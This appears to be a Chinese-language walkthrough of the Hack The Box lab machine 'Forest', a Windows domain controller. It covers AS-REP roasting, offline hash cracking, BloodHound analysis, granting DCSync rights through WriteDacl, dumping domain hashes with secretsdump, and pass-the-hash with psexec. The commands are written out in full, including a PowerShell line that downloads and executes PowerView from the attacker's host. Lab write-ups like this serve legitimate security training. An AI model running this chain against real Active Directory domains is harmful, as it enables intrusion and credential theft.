![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680260480857-1e1b7e45-9055-4d13-8f33-f38c21731caa.png#averageHue=%23171f28&clientId=ub6f8b5b7-47ff-4&from=paste&height=542&id=u70936632&name=image.png&originHeight=677&originWidth=1153&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=145970&status=done&style=none&taskId=ua59b7ce6-a1ea-4add-a490-8c63db0a3c2&title=&width=922.4)
这个easy好像是标错了？我看评分Medium的比Easy多。。。。Orz
# 一、知识点

- AD域渗透提取
- HoundBlood猎犬寻找最短路径
- Kerberos预身份验证风险
- Hash离线爆破
- PTH传递攻击
- DCSync攻击


# 二、信息搜集
Nmap先嗦一口`nmap -sS -sC -sV -Pn 10.10.10.161`，探测结果如下
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-31 15:41 CST
Nmap scan report for forest.htb (10.10.10.161)
Host is up (0.26s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-03-31 07:49:08Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
|_clock-skew: mean: 2h26m48s, deviation: 4h02m30s, median: 6m47s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time:
|   date: 2023-03-31T07:49:36
|_  start_date: 2023-03-31T07:42:13
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-03-31T00:49:34-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.80 seconds
```
发现存在smb和ldap服务，这两者都可以探测先，可以先使用`smbclent`去看看，发现是啥也没有的，然后开启MSF看看有无MS17漏洞
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680260759632-0e954f15-0d52-40bf-a08e-0f90f875bbcf.png#averageHue=%2335352b&clientId=u7548b3dd-f658-4&from=paste&height=118&id=u238cace4&name=image.png&originHeight=147&originWidth=1060&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=228838&status=done&style=none&taskId=ucaf2f4c9-d397-40a2-b495-5eaa9578fbc&title=&width=848)
也显然是没有的
# 三、Ldap匿名访问
因此思路放回ldap服务，既然开启了的话，是非常值得试一下有没有开启匿名访问的
根据nmap探测出的结果可以知道域名为`htb.local`
`ldapsearch -H ldap://10.10.10.161:389 -x -b "dc=htb,dc=local"`
> -x 简单验证，也就是anoymous匿名访问
> -b 指定筛选条件

![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680260932071-7f963f78-4825-4a16-a070-6fd57b3539c4.png#averageHue=%2333322b&clientId=u7548b3dd-f658-4&from=paste&height=96&id=u2c6cf6f3&name=image.png&originHeight=120&originWidth=828&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=171590&status=done&style=none&taskId=uc99ebb23-17c6-4bf2-884e-9812d9947f2&title=&width=662.4)
# 四、离线哈希爆破
茫茫人海可以瞟到svc-alfresco这个用户，google检索一波alfresco可以发现有趣的东西：
> Process Services is an enterprise Business Process Management (BPM) solution targeted at business people and developers. At its core is a high performance open-source business process engine based on Activiti with the flexibility and scalability to handle a wide variety of critical processes. Process Services provides a powerful suite of end user tools and integrates with a range of enterprise systems, including Alfresco Content Services, Box and Google Drive.
> Process Services 是一种针对业务人员和开发人员的企业业务流程管理 (BPM) 解决方案。 其核心是基于 Activiti 的高性能开源业务流程引擎，具有处理各种关键流程的灵活性和可扩展性。 Process Services 提供了一套功能强大的最终用户工具，并与一系列企业系统集成，包括 Alfresco Content Services、Box 和 Google Drive。

![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680260993039-38aa6640-4321-4fb1-bc7e-fb2131a5d114.png#averageHue=%23fdfdfc&clientId=u7548b3dd-f658-4&from=paste&height=727&id=ua610454e&name=image.png&originHeight=909&originWidth=1424&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=109114&status=done&style=none&taskId=u40dd48b3-73c4-40f8-af74-b5d9e5003a3&title=&width=1139.2)
这个服务对应的用户需要关闭kerberos的身份预验证服务
**有关kerberos协议的内容请自行去查看，网上很多，这个也是域渗透的基础**
当关闭了预身份验证后，攻击者可以使用指定用户去请求票据，此时域控不会作任何验证就将 TGT票据 和 该用户Hash加密的Session Key返回。因此，攻击者就可以对获取到的 用户Hash加密的Session Key进行离线破解，如果破解成功，就能得到该指定用户的密码明文。
使用这个工具包下的模块获取TGT票据：[https://github.com/fortra/impacket](https://github.com/fortra/impacket)
拿到kali后在setup.py文件所在地先`pip install .`将py文件全部变为模块，以后就可以直接`xx.py`使用
`GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass`
获取到票据后保存到文件
```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:ea889f8edb24751d735ffda00e6cff9f$534acd4d2abb6a071348a94f5263de0b6b0e46232fd890baabbca96b6ffe14941b61429c33581169c4ded4054d100acb6329ff4dbe2b8acfb8236896e79a549fd92803281118fa9df252883ca317fae2785f2a61337a68f12649b5bb646e1945503cc11dff113cb01e896189e233f6d05fdb85fe789f924cb890bae08cbac29b3062696df1c1cc0d909777ea54d94d5d8d0a22b4bdc18cefe2bb6f6b397c1856e42dfcbc9af2185c6d964464baa1d9b24634c37ab129b827798aeb60478235577ab44c9565fa4c1621da0a630c662a66173872ae74660114688a1964107c52ef7961d4ff47e6
```
随之用john工具对其进行rock
`john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt`
由于john有缓存
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680261788269-151519df-4334-4026-b32b-2ad86524df39.png#averageHue=%2322231e&clientId=u7548b3dd-f658-4&from=paste&height=80&id=udadd31f0&name=image.png&originHeight=100&originWidth=732&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93405&status=done&style=none&taskId=u87448e69-d6c4-46aa-9a87-ca5b20da8ba&title=&width=585.6)
可以看到密码为`s3rvice`知道用户的密码后就好说了，直接上`evil-winrm`去远程连接即可
` evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice`
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680261845197-f9ee2297-c57a-44ef-b4f2-e467b08ec478.png#averageHue=%2321211d&clientId=u7548b3dd-f658-4&from=paste&height=46&id=ufa74d3f8&name=image.png&originHeight=58&originWidth=618&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=59671&status=done&style=none&taskId=u6573c806-7714-4b8f-b022-bc699dc4be0&title=&width=494.4)
随后在desktop下发现user.txt，至此获取user权限

# 五、AD域渗透权限提升
这个我觉得也是全篇最难的地方，也是知识点最多的地方。。
## （1）BloodHound信息搜集
FirstofAll，windows权限提升是有一款专门的工具叫做猎犬：`BloodHound`
这个工具和tabby对标，tabby是找链子，BloodHound则是找最短获得System权限的路径，他们都是基于neo4j数据库进行逻辑分析的
这里首推kali中的`bloodhound-python`，运行`pip install bloodhound`
之后使用`bloodhound-python -d htb.local -usvc-alfresco -p s3rvice`去手机信息
> -d domain
> -u username
> -p password

收集完毕后会产生json结果数据：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680262694264-414dedc7-3616-4ac1-a964-ea5190ddef07.png#averageHue=%2334332c&clientId=u7e313bdf-7b57-4&from=paste&height=106&id=u435f43ad&name=image.png&originHeight=133&originWidth=854&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=201352&status=done&style=none&taskId=uc400a1c8-4505-4794-bd75-d297493f42b&title=&width=683.2)
随后我们需要做的是准备BloodHound的GUI界面，这个在windows中使用，他就是tabby，用来分析导入的json数据的，这个我们在github上也有开源的项目
[https://github.com/BloodHoundAD/BloodHound/releases](https://github.com/BloodHoundAD/BloodHound/releases)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680262735765-15764b8d-5cbd-4de9-b1b0-3cfca46b727b.png#averageHue=%23fefefe&clientId=u7e313bdf-7b57-4&from=paste&height=27&id=u72ad1424&name=image.png&originHeight=34&originWidth=328&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3520&status=done&style=none&taskId=ue879789f-581e-49ef-a498-8b286946f5b&title=&width=262.4)
安装win32-64的，安装完毕后解压出现`BloodHound.exe`运行，再此之前你需要安装neo4j数据库，默认的username（数据库）和password是`neo4j/neo4j`
之后就会出现GUI界面：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680262811447-febc8b62-89e4-4d6c-aeb3-a6aea800e360.png#averageHue=%23828282&clientId=u7e313bdf-7b57-4&from=paste&height=628&id=ub0cb0d64&name=image.png&originHeight=785&originWidth=1580&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=46090&status=done&style=none&taskId=u007c94ac-f3a1-423f-8bbc-e603709550c&title=&width=1264)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680262821244-e358caf0-4567-4a41-810f-b06eae3a5bfa.png#averageHue=%238ea6a1&clientId=u7e313bdf-7b57-4&from=paste&height=660&id=udedc5227&name=image.png&originHeight=825&originWidth=1431&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=32300&status=done&style=none&taskId=uee6cba8d-861a-498a-9be4-71c9c9c6326&title=&width=1144.8)
(我导入过数据了）
首先导入刚刚收集到的json文件：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680262852513-48fc4982-1e2b-4b9e-b33a-6d2542de4145.png#averageHue=%23f3f5f8&clientId=u7e313bdf-7b57-4&from=paste&height=45&id=u57d269c2&name=image.png&originHeight=56&originWidth=253&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1012&status=done&style=none&taskId=ua30e0740-17b2-4843-bc9f-09e73ce44c9&title=&width=202.4)
点击这个上传按钮将你的json文件全部提交上传
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680262871341-007bb829-291a-47ce-bdbf-b053221c0d07.png#averageHue=%23caa76b&clientId=u7e313bdf-7b57-4&from=paste&height=574&id=uf6a9a7c8&name=image.png&originHeight=717&originWidth=1278&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=102426&status=done&style=none&taskId=u7074de52-8039-4bec-9dee-f031970f216&title=&width=1022.4)
之后数据库info就会更新
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680262967995-6164af6b-8dcb-4ef1-9592-e784815074c7.png#averageHue=%23f2f2f2&clientId=u7e313bdf-7b57-4&from=paste&height=526&id=uc4906bc5&name=image.png&originHeight=658&originWidth=484&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30336&status=done&style=none&taskId=u3bb92cf6-2e93-4e89-a70b-f9494d0e0d3&title=&width=387.2)
随后我们查找一下我们已有用户`svc-alfresco`相关信息：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680263033638-6d93920f-4669-4e4d-a644-f375d97d1644.png#averageHue=%234ac14e&clientId=u7e313bdf-7b57-4&from=paste&height=729&id=u5894d149&name=image.png&originHeight=911&originWidth=1471&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=111277&status=done&style=none&taskId=uf05b1a6f-8e7d-433c-aaf7-90a46004a40&title=&width=1176.8)
## （2）信息分析
可以看到`unrolled group Membership`这可以让你展开与它有关的用户组和用户，点击之后可以发现
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680263107649-e0d89a89-42d1-468d-b447-12e0c5ad2c9c.png#averageHue=%23eff2f7&clientId=u7e313bdf-7b57-4&from=paste&height=1054&id=ucd8e44f3&name=image.png&originHeight=1318&originWidth=2257&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=120927&status=done&style=none&taskId=u3994aa3b-a525-496c-aaf6-70a5d66e1a3&title=&width=1805.6)
关系和权限写的明明白白，我们重点需要关注`PRIVILEGED IT ACCOUNTS`，你可以理解为这个组有ROOT权限，然后注意有个`ACCOUTN OPERATION`用户组，也就是可以对账户进行创建和修改的用户组
然后点击Shorest way to high target寻找最短路径
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680264089092-acdc2666-4f87-4d6c-962d-1502f23b7c3e.png#averageHue=%23eef0f3&clientId=u7e313bdf-7b57-4&from=paste&height=692&id=ub5d6b434&name=image.png&originHeight=865&originWidth=1294&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=66073&status=done&style=none&taskId=u147a2852-5080-452b-88d0-a68cf09e676&title=&width=1035.2)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680264154528-71901a58-48f5-46a3-9b53-18039dffb9dc.png#averageHue=%23e7ecf0&clientId=u7e313bdf-7b57-4&from=paste&height=301&id=ufa89986a&name=image.png&originHeight=376&originWidth=1109&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=117041&status=done&style=none&taskId=uf87ae8a1-f6e6-4140-a487-6f1e0e0beab&title=&width=887.2)
可以发现`EXCHANGE WINDOWS PERMISSONS`用户组是具有`WriteDacl`的权限
**WriteDacl 允许委托人修改受影响对象 DACL。这意味着攻击者可以添加或删除特定的访问控制项，从而使他们可以授予自己对对象的完全访问权限。因此，WriteDacl 是在链中启用其他权利的权利。**
当前拥有 WriteDacl 权限，没有 DCSync 权限。可以自己写入DCSync权限（下面会讲)，然后dump管理员的hash，最后进行PTH票据传递攻击
## （3）创建一个恶意用户
[https://www.freebuf.com/articles/web/308202.html](https://www.freebuf.com/articles/web/308202.html)
分析好了就开始实操，回到我们的evil-winrm，首先利用ACCOUNT OPERATION的权限去创建一个新的用户
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user boogipop abc123! /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" boogipop /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" boogipop /add
The command completed successfully.
```
这样用户就创建完毕了，之后利用WriteDacl权限去给我们用户所在组加权限，这里就得用到另外一个工具了
在其中的Recon模块中有个Powerview.ps1模块，这个模块可以协助我们进行权限赋予
首先在自己的机子上开python服务准备这个文件，然后再winrm中导入
`iex(new-Object net.webclient).downloadstring('[http://10.10.16.3:8000/PowerView.ps1')](http://10.10.16.3:8000/PowerView.ps1'))`
导入之后运行`menu`可以发现模块增加
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680264858155-38f6282f-93c5-487a-9a74-31424d165ae3.png#averageHue=%23303026&clientId=u7e313bdf-7b57-4&from=paste&height=438&id=udc4d8b14&name=image.png&originHeight=547&originWidth=1145&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=849010&status=done&style=none&taskId=u6a992c0f-8eb2-4c17-b19e-b6d300be3c4&title=&width=916)
首先定义2个变量
`$pass=convertto-securestring 'abc123!' -asplain -force`
`$cred=new-object system.management.automation.pscredential('htb\boogipop',$pass)`
其中Add-ObjectACL模块可以添加DCSync权限`Add-ObjectACL -PrincipalIdentity boogipop -Credential $cred -Rights DCSync`
## （4）DCSync攻击导出管理员hash
[https://shu1l.github.io/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/#DCSync%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8](https://shu1l.github.io/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/#DCSync%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8)
> DCSync攻击原理
> DCSync 的原理非常清晰，利用域控制器之间的数据同步复制。
> 
> 发现网络中的目标域控制器;
> 通过 DRS 服务的 GetNCChanges 接口发起数据同步请求，Directory Replication Service (DRS) Remote Protocol
> Samba wiki 关于 GetNCChanges 的描述包括:
>  当一个 DC (客户端 DC)想从其他 DC (服务端 DC)获取数据时，客户端 DC 会向服务端 DC 发起一个 GetNCChanges 请求。回应的数据包括需要同步的数据。
> 如果需要同步的数据比较多，则会重复上述过程。毕竟每次回应的数据有限。

主打一个数据同步
一个用户想发起 DCSync 攻击，必须获得以下任一用户的权限：

- Administrators组内的用户
- Domain Admins组内的用户
- Enterprise Admins组内的用户
- 域控制器的计算机帐户

上述过程中我们直接创建了一个有Sync权限的用户，因此接下来该做的解释导出管理员hash，这里还是使用impacket包下的一个模块`secretsdump`
`secretsdump.py  htb/boogipop@10.10.10.161`
之后可以获取所域中所有用户的hash，包括admin的
```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
可以发现admin的hash
## （5）PTH票据传递获取Root
最后通过PTH攻击即可获取root权限，这里使用的也是该工具包中的模块`psexec`
`psexec.py administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6`
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680265239008-a7e4ecae-0c65-4eb3-8e5c-0df51a4bea9b.png#averageHue=%23343328&clientId=u7e313bdf-7b57-4&from=paste&height=289&id=u35f926c7&name=image.png&originHeight=361&originWidth=1205&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=585428&status=done&style=none&taskId=uf9b6c975-d0eb-406c-ad43-b65f7e706d8&title=&width=964)
获取system权限。
最后也是在desktop中获取root.txt
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680265274467-22fa66dd-c8d9-476d-b670-cc3999e5ad08.png#averageHue=%23313128&clientId=u7e313bdf-7b57-4&from=paste&height=56&id=ub065a31e&name=image.png&originHeight=70&originWidth=749&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=78940&status=done&style=none&taskId=u7a48021c-72a8-4022-92da-b1edb46889e&title=&width=599.2)
拿下~


